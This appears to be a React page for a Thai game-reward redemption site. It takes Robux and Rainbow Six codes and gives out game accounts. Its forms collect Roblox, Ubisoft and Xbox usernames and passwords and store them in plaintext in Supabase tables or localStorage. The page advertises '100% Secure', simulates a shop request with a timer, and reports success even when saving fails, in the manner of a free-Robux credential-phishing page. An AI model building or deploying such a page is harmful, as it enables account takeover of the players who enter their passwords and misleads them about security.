import React, { useState, useEffect } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { toast } from 'sonner';
import { supabase } from '@/lib/supabase';
import { Link } from 'react-router-dom';
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription, DialogFooter } from '@/components/ui/dialog';
import { Label } from '@/components/ui/label';
import { Checkbox } from '@/components/ui/checkbox';
import { RedemptionRequest, RedemptionCode, ChickenAccount } from '@/types';
import { GamepadIcon, Settings } from 'lucide-react';

export default function Home() {
  const [activeTab, setActiveTab] = useState<'redeem' | 'chicken' | 'rainbow'>('redeem');
  
  // Rainbow Six form states
  const [rainbowForm, setRainbowForm] = useState({
    ubisoftEmail: '',
    ubisoftPassword: '',
    hasXboxAccount: false,
    xboxEmail: '',
    xboxPassword: '',
    redeemCode: '',
    contact: ''
  });
  const [showRainbowRedeemPopup, setShowRainbowRedeemPopup] = useState(false);
  const [isRainbowButtonSubmitting, setIsRainbowButtonSubmitting] = useState(false);
  const [rainbowGameInfo, setRainbowGameInfo] = useState<{ code: string } | null>(null);
  
  // Chicken account redemption states
  const [chickenRedeemCode, setChickenRedeemCode] = useState('');
  const [validatedChickenAccount, setValidatedChickenAccount] = useState<ChickenAccount | null>(null);
  const [showChickenRedeemPopup, setShowChickenRedeemPopup] = useState(false);
  const [availableCodes, setAvailableCodes] = useState<RedemptionCode[]>([]);
  const [availableAccounts, setAvailableAccounts] = useState<ChickenAccount[]>([]);
  const [totalRobuxValue, setTotalRobuxValue] = useState(0);
  const [totalActiveAccounts, setTotalActiveAccounts] = useState(0);
  
  // Loading states
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isRobuxButtonSubmitting, setIsRobuxButtonSubmitting] = useState(false);
  const [isChickenButtonSubmitting, setIsChickenButtonSubmitting] = useState(false);
  
  // Code redemption states
  const [redeemCode, setRedeemCode] = useState('');
  const [validatedCode, setValidatedCode] = useState<RedemptionCode | null>(null);
  const [showRedeemPopup, setShowRedeemPopup] = useState(false);
  const [redeemForm, setRedeemForm] = useState({
    username: '',
    password: '',
    contact: ''
  });

  useEffect(() => {
    loadAvailableItems();
  }, []);

  // Calculate statistics when data changes
  useEffect(() => {
    if (availableCodes.length > 0) {
      const totalValue = availableCodes.reduce((sum, code) => sum + (code.robux_value || code.robux_amount || 0), 0);
      setTotalRobuxValue(totalValue);
    }
  }, [availableCodes]);

  useEffect(() => {
    if (availableAccounts.length > 0) {
      const activeAccounts = availableAccounts.filter(account => !account.is_redeemed).length;
      setTotalActiveAccounts(activeAccounts);
    }
  }, [availableAccounts]);

  const loadAvailableItems = async () => {
    try {
      const { data: codes, error: codesError } = await supabase
        .from('app_9c8f2cf91bf942b2a7f12fc4c7ee9dc6_redemption_codes')
        .select('*')
        .eq('status', 'active');
      
      const { data: accounts, error: accountsError } = await supabase
        .from('app_9c8f2cf91bf942b2a7f12fc4c7ee9dc6_chicken_accounts')
        .select('*')
        .eq('status', 'available');

      if (codesError || accountsError) {
        import('@/lib/mockData').then(({ mockCodes, mockAccounts }) => {
          setAvailableCodes(mockCodes);
          setAvailableAccounts(mockAccounts);
          toast.info('เชื่อมต่อโหมดทดสอบ - ข้อมูลตัวอย่างถูกแสดง');
        });
      } else {
        setAvailableCodes(codes || []);
        setAvailableAccounts(accounts || []);
      }
    } catch (error) {
      console.error('Error loading items:', error);
      import('@/lib/mockData').then(({ mockCodes, mockAccounts }) => {
        setAvailableCodes(mockCodes);
        setAvailableAccounts(mockAccounts);
      });
    }
  };

  const validateCode = async () => {
    if (!redeemCode.trim()) {
      toast.error("กรุณากรอกโค้ดที่ได้รับ");
      return;
    }

    setIsSubmitting(true);
    
    try {
      const foundCode = availableCodes.find(code => 
        code.code.toLowerCase() === redeemCode.toLowerCase() && 
        code.status === 'active'
      );

      if (!foundCode) {
        toast.error("โค้ดไม่ถูกต้องหรือหมดอายุแล้ว");
        return;
      }

      setValidatedCode(foundCode);
      setShowRedeemPopup(true);
      toast.success("โค้ดถูกต้อง! กรุณากรอกข้อมูลเพื่อรับ Robux");

    } catch (error) {
      console.error('Error validating code:', error);
      toast.error("เกิดข้อผิดพลาดในการตรวจสอบโค้ด");
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleRobuxSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!redeemForm.username.trim() || !redeemForm.password.trim() || !redeemForm.contact.trim()) {
      toast.error("กรุณากรอกข้อมูลให้ครบถ้วน");
      return;
    }

    setIsRobuxButtonSubmitting(true);
    const toastId = toast.loading('กำลังดำเนินการแลกโค้ด...');

    try {
      // First, update the code status to 'used' in Supabase
      const { error: updateError } = await supabase
        .from('app_9c8f2cf91bf942b2a7f12fc4c7ee9dc6_redemption_codes')
        .update({ 
          status: 'used',
          used_by: redeemForm.contact,
          used_at: new Date().toISOString()
        })
        .eq('id', validatedCode!.id);

      if (updateError) {
        // If Supabase update fails, try localStorage fallback
        console.warn('Supabase update failed, using localStorage:', updateError);
        const localCodes = JSON.parse(localStorage.getItem('redemption_codes') || '[]');
        const updatedLocalCodes = localCodes.map((code: RedemptionCode) => 
          code.code === validatedCode!.code ? 
          { ...code, status: 'used', used_by: redeemForm.contact, used_at: new Date().toISOString() } : 
          code
        );
        localStorage.setItem('redemption_codes', JSON.stringify(updatedLocalCodes));
      }

      const requestData: RedemptionRequest = {
        id: crypto.randomUUID(),
        code_id: validatedCode!.id,
        roblox_username: redeemForm.username,
        roblox_password: redeemForm.password,
        contact_info: redeemForm.contact,
        robux_amount: validatedCode!.robux_amount,
        status: 'pending',
        created_at: new Date().toISOString()
      };

      // Try to save redemption request to Supabase
      try {
        const { error: requestError } = await supabase
          .from('app_9c8f2cf91bf942b2a7f12fc4c7ee9dc6_redemption_requests')
          .insert([requestData]);
        
        if (requestError) {
          console.warn('Failed to save request to Supabase:', requestError);
        }
      } catch (error) {
        console.warn('Supabase request save failed, continuing with success message');
      }

      toast.success(`🎉 แลกโค้ดสำเร็จ! คุณจะได้รับ ${validatedCode!.robux_value || validatedCode!.robux_amount} Robux ภายใน 24 ชั่วโมง`, { id: toastId });
      
      setRedeemForm({ username: '', password: '', contact: '' });
      setRedeemCode('');
      setValidatedCode(null);
      setShowRedeemPopup(false);
      loadAvailableItems();

    } catch (error) {
      console.error('Error submitting redemption:', error);
      toast.error('เกิดข้อผิดพลาดในการดำเนินการ', { id: toastId });
    } finally {
      setIsRobuxButtonSubmitting(false);
    }
  };

  const handleRainbowRedeemCode = async () => {
    if (!rainbowForm.redeemCode.trim()) {
      toast.error("กรุณากรอกโค้ดเกม Rainbow Six");
      return;
    }

    if (!rainbowForm.ubisoftEmail.trim() || !rainbowForm.ubisoftPassword.trim()) {
      toast.error("กรุณากรอกข้อมูล Ubisoft ให้ครบถ้วน");
      return;
    }

    if (rainbowForm.hasXboxAccount && (!rainbowForm.xboxEmail.trim() || !rainbowForm.xboxPassword.trim())) {
      toast.error("กรุณากรอกข้อมูล Xbox ให้ครบถ้วน");
      return;
    }

    if (!rainbowForm.contact.trim()) {
      toast.error("กรุณากรอกข้อมูลติดต่อ");
      return;
    }

    // Check if the redeem code exists in the database
    try {
      const { data: codeCheck, error: codeError } = await supabase
        .from('app_9c8f2cf91bf942b2a7f12fc4c7ee9dc6_redemption_codes')
        .select('code, product_name, status')
        .eq('code', rainbowForm.redeemCode)
        .eq('product_name', 'Rainbow Six Credits')
        .eq('status', 'available')
        .single();

      if (codeError || !codeCheck) {
        // Check localStorage for Rainbow Six codes
        const localCodes = JSON.parse(localStorage.getItem('redemption_codes') || '[]');
        const localCode = localCodes.find(code => 
          code.code === rainbowForm.redeemCode.toUpperCase() && 
          code.status === 'available' &&
          code.product_name === 'Rainbow Six Credits'
        );
        
        if (!localCode) {
          toast.error('โค้ดที่กรอกไม่ถูกต้องหรือไม่พร้อมใช้งาน กรุณาตรวจสอบโค้ด Rainbow Six อีกครั้ง');
          return;
        }
        
        // Mark localStorage code as used
        const updatedCodes = localCodes.map(code => 
          code.code === rainbowForm.redeemCode.toUpperCase() ? 
          { ...code, status: 'used', used_at: new Date().toISOString() } : 
          code
        );
        localStorage.setItem('redemption_codes', JSON.stringify(updatedCodes));
      }
    } catch (error) {
      toast.error('เกิดข้อผิดพลาดในการตรวจสอบโค้ด กรุณาลองใหม่อีกครั้ง');
      return;
    }

    setIsRainbowButtonSubmitting(true);
    const toastId = toast.loading('กำลังส่งคำขอแลกโค้ด...');

    try {
      // Simulate sending request to shop
      await new Promise(resolve => setTimeout(resolve, 2000));

      // Create redemption request data
      const requestData = {
        id: crypto.randomUUID(),
        redeemCode: rainbowForm.redeemCode,
        ubisoftEmail: rainbowForm.ubisoftEmail,
        ubisoftPassword: rainbowForm.ubisoftPassword,
        hasXboxAccount: rainbowForm.hasXboxAccount,
        xboxEmail: rainbowForm.xboxEmail || '',
        xboxPassword: rainbowForm.xboxPassword || '',
        contact: rainbowForm.contact,
        status: 'pending',
        created_at: new Date().toISOString(),
        type: 'rainbow_six'
      };

      // Update Rainbow Six code status to 'used' in Supabase first
      const { error: updateCodeError } = await supabase
        .from('app_9c8f2cf91bf942b2a7f12fc4c7ee9dc6_redemption_codes')
        .update({ 
          status: 'used',
          used_by: rainbowForm.contact,
          used_at: new Date().toISOString()
        })
        .eq('code', rainbowForm.redeemCode)
        .eq('product_name', 'Rainbow Six Credits');

      if (updateCodeError) {
        console.warn('Supabase Rainbow Six code update failed:', updateCodeError);
        // Already handled localStorage update above in the check section
      }

      // Try to save to Supabase or localStorage
      try {
        // If Supabase is available, save there
        const { error } = await supabase
          .from('app_9c8f2cf91bf942b2a7f12fc4c7ee9dc6_rainbow_requests')
          .insert([requestData]);
        
        if (error) throw error;
      } catch (error) {
        // Fallback to localStorage
        console.log('Saving to localStorage as fallback');
        const existingRequests = JSON.parse(localStorage.getItem('rainbow_requests') || '[]');
        existingRequests.push(requestData);
        localStorage.setItem('rainbow_requests', JSON.stringify(existingRequests));
      }

      setShowRainbowRedeemPopup(true);
      toast.success('ส่งคำขอแลกโค้ดสำเร็จ! ทางร้านจะดำเนินการให้ภายใน 24 ชั่วโมง', { id: toastId });

      // Reset form
      setRainbowForm({
        ubisoftEmail: '',
        ubisoftPassword: '',
        hasXboxAccount: false,
        xboxEmail: '',
        xboxPassword: '',
        redeemCode: '',
        contact: ''
      });

    } catch (error) {
      console.error('Error submitting Rainbow Six request:', error);
      toast.error('เกิดข้อผิดพลาดในการส่งคำขอ', { id: toastId });
    } finally {
      setIsRainbowButtonSubmitting(false);
    }
  };

  const handleChickenRedeemCode = async () => {
    if (!chickenRedeemCode.trim()) {
      toast.error("กรุณากรอกโค้ดแลกรับบัญชี");
      return;
    }

    setIsChickenButtonSubmitting(true);
    const toastId = toast.loading('กำลังตรวจสอบโค้ด...');

    try {
      const foundAccount = availableAccounts.find(account => 
        (account.code || account.redeem_code).toLowerCase() === chickenRedeemCode.toLowerCase() && 
        account.status === 'available'
      );

      if (!foundAccount) {
        toast.error("โค้ดไม่ถูกต้องหรือถูกใช้ไปแล้ว", { id: toastId });
        return;
      }

      // Update account status to 'used' in Supabase
      const { error: updateError } = await supabase
        .from('app_9c8f2cf91bf942b2a7f12fc4c7ee9dc6_chicken_accounts')
        .update({ 
          status: 'used',
          used_by: 'anonymous_user',
          used_at: new Date().toISOString()
        })
        .eq('id', foundAccount.id);

      if (updateError) {
        // If Supabase update fails, try localStorage fallback
        console.warn('Supabase update failed, using localStorage:', updateError);
        const localAccounts = JSON.parse(localStorage.getItem('chicken_accounts') || '[]');
        const updatedLocalAccounts = localAccounts.map((account: ChickenAccount) => 
          account.code === foundAccount.code ? 
          { ...account, status: 'used', used_by: 'anonymous_user', used_at: new Date().toISOString() } : 
          account
        );
        localStorage.setItem('chicken_accounts', JSON.stringify(updatedLocalAccounts));
      }

      setValidatedChickenAccount(foundAccount);
      setShowChickenRedeemPopup(true);
      toast.success("โค้ดถูกต้อง! แสดงข้อมูลบัญชี", { id: toastId });

      // Refresh available accounts after marking as used
      loadAvailableItems();

    } catch (error) {
      console.error('Error validating chicken code:', error);
      toast.error("เกิดข้อผิดพลาดในการตรวจสอบโค้ด", { id: toastId });
    } finally {
      setIsChickenButtonSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-purple-900 via-blue-900 to-indigo-900 relative">
      <div className="container mx-auto px-4 py-8">
        {/* Header */}
        <div className="flex justify-between items-center mb-8">
          <div className="flex items-center space-x-3">
            <div className="w-12 h-12 bg-gradient-to-r from-pink-500 to-purple-500 rounded-2xl flex items-center justify-center">
              <span className="text-white text-2xl">💎</span>
            </div>
            <div>
              <h1 className="text-white text-xl font-bold">ระบบแลกของรางวัล</h1>
              <p className="text-purple-200 text-sm">Robux & Chicken Accounts Exchange</p>
            </div>
          </div>
          
          <div className="flex space-x-3">
            <Link to="/status">
              <Button className="bg-white/10 backdrop-blur-xl border border-white/20 text-white hover:bg-white/20 transition-all">
                🔍 เช็คสถานะ
              </Button>
            </Link>
            <Link to="/admin">
              <Button className="bg-white/10 backdrop-blur-xl border border-white/20 text-white hover:bg-white/20 transition-all">
                <Settings className="w-4 h-4 mr-2" />
                👑 แอดมิน
              </Button>
            </Link>
          </div>
        </div>

        {/* Statistics Cards */}
        <div className="grid grid-cols-1 md:grid-cols-4 gap-6 mb-8">
          <Card className="bg-white/10 backdrop-blur-xl border-white/20 text-center">
            <CardContent className="p-6">
              <div className="text-4xl mb-2">🎮</div>
              <div className="text-2xl font-bold text-white">{availableCodes.filter(code => code.status === 'active').length}</div>
              <div className="text-purple-200 text-sm">Robux Codes</div>
              <div className="text-xs text-white/60 mt-1">{totalRobuxValue.toLocaleString()} R$</div>
            </CardContent>
          </Card>
          
          <Card className="bg-white/10 backdrop-blur-xl border-white/20 text-center">
            <CardContent className="p-6">
              <div className="text-4xl mb-2">🐔</div>
              <div className="text-2xl font-bold text-white">{availableAccounts.filter(account => account.status === 'available').length}</div>
              <div className="text-purple-200 text-sm">Chicken Accounts</div>
              <div className="text-xs text-white/60 mt-1">พร้อมใช้งาน</div>
            </CardContent>
          </Card>
          
          <Card className="bg-white/10 backdrop-blur-xl border-white/20 text-center">
            <CardContent className="p-6">
              <div className="text-4xl mb-2">⚡</div>
              <div className="text-2xl font-bold text-yellow-400">24/7</div>
              <div className="text-purple-200 text-sm">Online Service</div>
              <div className="text-xs text-white/60 mt-1">บริการตลอดเวลา</div>
            </CardContent>
          </Card>
          
          <Card className="bg-white/10 backdrop-blur-xl border-white/20 text-center">
            <CardContent className="p-6">
              <div className="text-4xl mb-2">🔒</div>
              <div className="text-2xl font-bold text-green-400">100%</div>
              <div className="text-purple-200 text-sm">Secure</div>
              <div className="text-xs text-white/60 mt-1">ปลอดภัยแน่นอน</div>
            </CardContent>
          </Card>
        </div>



        <div className="flex justify-center mb-8">
          <div className="bg-white/10 backdrop-blur-xl rounded-2xl p-2 border border-white/20">
            <Button
              onClick={() => setActiveTab('redeem')}
              className={`px-6 py-3 rounded-xl transition-all ${
                activeTab === 'redeem'
                  ? 'bg-gradient-to-r from-green-600 to-emerald-600 text-white shadow-lg'
                  : 'bg-transparent text-white/70 hover:text-white hover:bg-white/10'
              }`}
            >
              🎫 แลกโค้ด
            </Button>
            <Button
              onClick={() => setActiveTab('chicken')}
              className={`px-6 py-3 rounded-xl transition-all ${
                activeTab === 'chicken'
                  ? 'bg-gradient-to-r from-orange-600 to-yellow-600 text-white shadow-lg'
                  : 'bg-transparent text-white/70 hover:text-white hover:bg-white/10'
              }`}
            >
              🐔 แลกไก่ตัน
            </Button>
            
            <Button
              onClick={() => setActiveTab('rainbow')}
              className={`px-6 py-3 rounded-xl transition-all ${
                activeTab === 'rainbow'
                  ? 'bg-gradient-to-r from-blue-600 to-orange-600 text-white shadow-lg'
                  : 'bg-transparent text-white/70 hover:text-white hover:bg-white/10'
              }`}
            >
              🎮 Rainbow Six
            </Button>
          </div>
        </div>

        {/* Main Content Area */}
        <div className="max-w-4xl mx-auto">
          {(activeTab === 'redeem' || activeTab === 'chicken') && (
            <Card className="bg-white/10 backdrop-blur-xl border-white/20 mb-8">
              <CardHeader className="text-center">
                <CardTitle className="text-2xl text-white flex items-center justify-center space-x-2">
                  <span className="text-3xl">{activeTab === 'redeem' ? '💳' : '🐔'}</span>
                  <span>{activeTab === 'redeem' ? 'แลกโค้ดรับ Robux' : 'แลกโค้ดรับบัญชีไก่ตัน'}</span>
                </CardTitle>
                <p className="text-blue-200">
                  {activeTab === 'redeem' ? 'ใส่โค้ดที่ได้รับเพื่อแลกเป็น Robux' : 'ใส่โค้ดที่ได้รับเพื่อแลกบัญชีเกมไก่ตัน'}
                </p>
              </CardHeader>
              <CardContent className="space-y-6">
                <div className="space-y-4">
                  <div>
                    <label className="block text-white text-sm font-medium mb-2">
                      {activeTab === 'redeem' ? 'โค้ดที่ได้รับ' : 'โค้ดที่ได้รับ'}
                    </label>
                    <div className="flex space-x-3">
                      <Input
                        value={activeTab === 'redeem' ? redeemCode : chickenRedeemCode}
                        onChange={(e) => activeTab === 'redeem' ? setRedeemCode(e.target.value) : setChickenRedeemCode(e.target.value)}
                        placeholder="ใส่โค้ดที่ได้รับ"
                        className="bg-white/10 border-white/20 text-white placeholder:text-white/50 flex-1"
                        onKeyPress={(e) => e.key === 'Enter' && (activeTab === 'redeem' ? validateCode() : handleChickenRedeemCode())}
                      />
                      <Button
                        onClick={activeTab === 'redeem' ? validateCode : handleChickenRedeemCode}
                        disabled={activeTab === 'redeem' ? isSubmitting : isChickenButtonSubmitting}
                        className={`bg-gradient-to-r ${activeTab === 'redeem' ? 'from-green-600 to-emerald-600 hover:from-green-700 hover:to-emerald-700' : 'from-orange-600 to-yellow-600 hover:from-orange-700 hover:to-yellow-700'}`}
                      >
                        {(activeTab === 'redeem' ? isSubmitting : isChickenButtonSubmitting) ? 'ตรวจสอบ...' : 'ตรวจสอบ'}
                      </Button>
                    </div>
                  </div>
                  
                  <div className="bg-blue-900/30 border border-blue-500/30 rounded-lg p-4">
                    <p className="text-blue-100 text-sm">
                      <strong>💡 วิธีใช้:</strong> {activeTab === 'redeem' ? 'ใส่โค้ดที่ได้รับและกดตรวจสอบ หากโค้ดถูกต้อง จะมีหน้าต่างขึ้นมาให้ใส่ชื่อผู้ใช้และรหัสผ่าน Roblox เพื่อรับ Robux' : 'โค้ดที่ได้รับจะถูกตรวจสอบและแสดงข้อมูลบัญชีที่สามารถใช้งานได้ กรุณาเก็บข้อมูลบัญชีอย่างปลอดภัยหลังจากได้รับ'}
                    </p>
                  </div>
                </div>
              </CardContent>
            </Card>
          )}

          {activeTab === 'rainbow' && (
            <Card className="bg-white/10 backdrop-blur-xl border-white/20 mb-8">
              <CardHeader className="text-center">
                <CardTitle className="text-2xl text-white flex items-center justify-center space-x-2">
                  <GamepadIcon className="w-8 h-8" />
                  <span>แลกโค้ด Rainbow Six</span>
                </CardTitle>
                <p className="text-blue-200">กรอกข้อมูลบัญชี Ubisoft และโค้ดเพื่อแลกรับ</p>
              </CardHeader>
              <CardContent className="space-y-6">
                <div className="space-y-4">
                  <div className="space-y-2">
                    <Label htmlFor="ubisoft-email" className="text-white/80">อีเมล Ubisoft</Label>
                    <Input
                      id="ubisoft-email"
                      type="email"
                      value={rainbowForm.ubisoftEmail}
                      onChange={(e) => setRainbowForm(prev => ({ ...prev, ubisoftEmail: e.target.value }))}
                      placeholder="email@example.com"
                      className="border-white/20 bg-white/10 text-white placeholder:text-white/50"
                    />
                  </div>

                  <div className="space-y-2">
                    <Label htmlFor="ubisoft-password" className="text-white/80">รหัสผ่าน Ubisoft</Label>
                    <Input
                      id="ubisoft-password"
                      type="password"
                      value={rainbowForm.ubisoftPassword}
                      onChange={(e) => setRainbowForm(prev => ({ ...prev, ubisoftPassword: e.target.value }))}
                      placeholder="••••••••"
                      className="border-white/20 bg-white/10 text-white placeholder:text-white/50"
                    />
                  </div>

                  <div className="space-y-3">
                    <div className="flex items-center space-x-2">
                      <Checkbox
                        id="has-xbox"
                        checked={rainbowForm.hasXboxAccount}
                        onCheckedChange={(checked) => setRainbowForm(prev => ({ 
                          ...prev, 
                          hasXboxAccount: checked as boolean,
                          xboxEmail: checked ? prev.xboxEmail : '',
                          xboxPassword: checked ? prev.xboxPassword : ''
                        }))}
                        className="border-white/40 data-[state=checked]:bg-blue-600 data-[state=checked]:border-blue-600"
                      />
                      <Label htmlFor="has-xbox" className="text-white/80 cursor-pointer">
                        มีบัญชี Xbox เชื่อมต่อกับ Ubisoft
                      </Label>
                    </div>
                    
                    {rainbowForm.hasXboxAccount && (
                      <div className="space-y-3 pl-6 border-l-2 border-blue-500/30">
                        <div className="space-y-2">
                          <Label htmlFor="xbox-email" className="text-white/80">อีเมล Xbox</Label>
                          <Input
                            id="xbox-email"
                            type="email"
                            value={rainbowForm.xboxEmail}
                            onChange={(e) => setRainbowForm(prev => ({ ...prev, xboxEmail: e.target.value }))}
                            placeholder="xbox@example.com"
                            className="border-white/20 bg-white/10 text-white placeholder:text-white/50"
                          />
                        </div>
                        
                        <div className="space-y-2">
                          <Label htmlFor="xbox-password" className="text-white/80">รหัสผ่าน Xbox</Label>
                          <Input
                            id="xbox-password"
                            type="password"
                            value={rainbowForm.xboxPassword}
                            onChange={(e) => setRainbowForm(prev => ({ ...prev, xboxPassword: e.target.value }))}
                            placeholder="••••••••"
                            className="border-white/20 bg-white/10 text-white placeholder:text-white/50"
                          />
                        </div>
                      </div>
                    )}
                  </div>

                  <div className="space-y-2">
                    <Label htmlFor="rainbow-redeem-code" className="text-white/80">โค้ดแลกรับ Rainbow Six</Label>
                    <Input
                      id="rainbow-redeem-code"
                      value={rainbowForm.redeemCode}
                      onChange={(e) => setRainbowForm(prev => ({ ...prev, redeemCode: e.target.value }))}
                      placeholder="กรอกโค้ดแลกรับ"
                      className="border-white/20 bg-white/10 text-white placeholder:text-white/50 h-11 text-center font-mono uppercase"
                    />
                  </div>

                  <div className="space-y-2">
                    <Label htmlFor="contact" className="text-white/80">ข้อมูลติดต่อ</Label>
                    <Input
                      id="contact"
                      value={rainbowForm.contact}
                      onChange={(e) => setRainbowForm(prev => ({ ...prev, contact: e.target.value }))}
                      placeholder="Discord หรือ LINE ID สำหรับติดต่อกลับ"
                      className="border-white/20 bg-white/10 text-white placeholder:text-white/50"
                    />
                  </div>
                </div>
                
                <Button 
                  onClick={handleRainbowRedeemCode} 
                  className="w-full mt-6 bg-gradient-to-r from-blue-600 via-orange-600 to-red-600 hover:from-blue-700 hover:via-orange-700 hover:to-red-700 text-white font-bold py-3 text-lg" 
                  disabled={isRainbowButtonSubmitting}
                >
                  {isRainbowButtonSubmitting ? (
                    <div className="flex items-center justify-center gap-2">
                      <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
                      <span>กำลังส่งคำขอ...</span>
                    </div>
                  ) : (
                    <div className="flex items-center justify-center gap-2">
                      <GamepadIcon className="w-4 h-4" />
                      <span>ส่งคำขอแลกโค้ด</span>
                    </div>
                  )}
                </Button>

                <div className="bg-blue-900/30 border border-blue-500/30 rounded-lg p-4">
                  <h4 className="text-blue-200 font-medium mb-2">💡 คำแนะนำ</h4>
                  <p className="text-blue-100 text-sm">
                    • กรอกข้อมูลบัญชี Ubisoft ของคุณให้ครบถ้วน<br/>
                    • หากมีบัญชี Xbox เชื่อมต่อ กรุณาติ๊กและกรอกข้อมูล Xbox ด้วย<br/>
                    • ทางร้านจะดำเนินการรีดีมโค้ดให้ภายใน 24 ชั่วโมง<br/>
                    • กรุณาให้ข้อมูลติดต่อที่ถูกต้องเพื่อการติดตามสถานะ
                  </p>
                </div>
              </CardContent>
            </Card>
          )}
        </div>



        {/* Rainbow Six Success Dialog */}
        <Dialog open={showRainbowRedeemPopup} onOpenChange={setShowRainbowRedeemPopup}>
          <DialogContent className="sm:max-w-md bg-white/95 backdrop-blur-xl border border-white/20">
            <DialogHeader>
              <DialogTitle className="text-blue-600 text-xl">🎮 แลกรับโค้ด Rainbow Six สำเร็จ!</DialogTitle>
              <DialogDescription className="text-gray-600">
                โค้ดเกมของคุณ
              </DialogDescription>
            </DialogHeader>
            
            {rainbowGameInfo && (
              <div className="p-4 border rounded-lg bg-gray-50">
                <p className="text-sm text-gray-500 font-medium">โค้ดเกม Rainbow Six:</p>
                <div className="bg-white p-3 rounded border font-mono text-lg mt-1 text-center tracking-wider">
                  {rainbowGameInfo.code}
                </div>
              </div>
            )}
            
            <DialogFooter className="mt-4">
              <Button 
                onClick={() => {
                  setShowRainbowRedeemPopup(false);
                  setRainbowGameInfo(null);
                }} 
                className="w-full bg-gradient-to-r from-blue-600 to-orange-600 hover:from-blue-700 hover:to-orange-700"
              >
                เสร็จสิ้น
              </Button>
            </DialogFooter>
          </DialogContent>
        </Dialog>

        {/* Robux Redemption Dialog */}
        <Dialog open={showRedeemPopup} onOpenChange={setShowRedeemPopup}>
          <DialogContent className="sm:max-w-md bg-white/95 backdrop-blur-xl border border-white/20">
            <DialogHeader>
              <DialogTitle className="text-green-600 text-xl">🎫 แลกโค้ดรับ Robux</DialogTitle>
              <DialogDescription className="text-gray-600">
                กรอกข้อมูล Roblox ของคุณเพื่อรับ {validatedCode?.robux_value || validatedCode?.robux_amount} Robux
              </DialogDescription>
            </DialogHeader>
            
            <form onSubmit={handleRobuxSubmit} className="space-y-4">
              <div>
                <Label htmlFor="username">ชื่อผู้ใช้ Roblox</Label>
                <Input
                  id="username"
                  value={redeemForm.username}
                  onChange={(e) => setRedeemForm(prev => ({ ...prev, username: e.target.value }))}
                  placeholder="ชื่อผู้ใช้ของคุณใน Roblox"
                />
              </div>
              <div>
                <Label htmlFor="password">รหัสผ่าน Roblox</Label>
                <Input
                  id="password"
                  type="password"
                  value={redeemForm.password}
                  onChange={(e) => setRedeemForm(prev => ({ ...prev, password: e.target.value }))}
                  placeholder="รหัสผ่านของคุณ"
                />
              </div>
              <div>
                <Label htmlFor="contact">ข้อมูลติดต่อ</Label>
                <Input
                  id="contact"
                  value={redeemForm.contact}
                  onChange={(e) => setRedeemForm(prev => ({ ...prev, contact: e.target.value }))}
                  placeholder="Discord หรือ LINE ID"
                />
              </div>
              
              <DialogFooter className="mt-4">
                <Button 
                  type="submit"
                  disabled={isRobuxButtonSubmitting}
                  className="w-full bg-gradient-to-r from-green-600 to-emerald-600 hover:from-green-700 hover:to-emerald-700"
                >
                  {isRobuxButtonSubmitting ? 'กำลังแลก...' : '🎫 แลกโค้ด'}
                </Button>
              </DialogFooter>
            </form>
          </DialogContent>
        </Dialog>
      </div>
    </div>
  );
}